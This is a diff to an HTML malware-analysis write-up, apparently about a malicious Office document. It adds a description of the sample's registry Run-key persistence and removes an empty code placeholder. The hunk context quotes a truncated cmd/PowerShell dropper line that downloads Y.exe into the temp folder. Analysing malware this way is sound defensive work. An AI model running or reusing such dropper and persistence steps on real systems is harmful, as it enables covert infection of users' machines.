@@ -130,6 +130,8 @@ cmd.exe /c PowerShell "try{$p=$env:temp+'\Y.exe';Import-Module BitsTransfer;Star
 				</code></pre>
 				<br>
 			<h3>Persistence</h3>
+			<p>To maintain persistence on an infected machine <code>Y.exe</code> copies itself into <code>C:\Users\Flare\AppData\Roaming\MyApp\</code> and adds the below registry run key.
+			<code>HKU\S-1-5-21-659255541-1974059150-103366843-1000\Software\Microsoft\Windows\CurrentVersion\Run\MyApp</code> . This will ensure <code>MyApp.exe</code> runs each time current user logs in.</p>
 			<h3>Privilege Escalation</h3>
 			<h3>Credential Access</h3>
 			<h3>Discovery</h3>
@@ -140,11 +142,6 @@ cmd.exe /c PowerShell "try{$p=$env:temp+'\Y.exe';Import-Module BitsTransfer;Star
 			<h3>Final Thoughts</h3>
 			<p>A huge thanks to Didier Stevens for making a fantastic library of OLE analysis tools. </p>
 	      <br>
-	      <!-- NMAP Code-->
-			<pre><code class="language-none">
-				code block.
-
-			</code></pre>
 	    </div>
 	  </div>
 	</div>
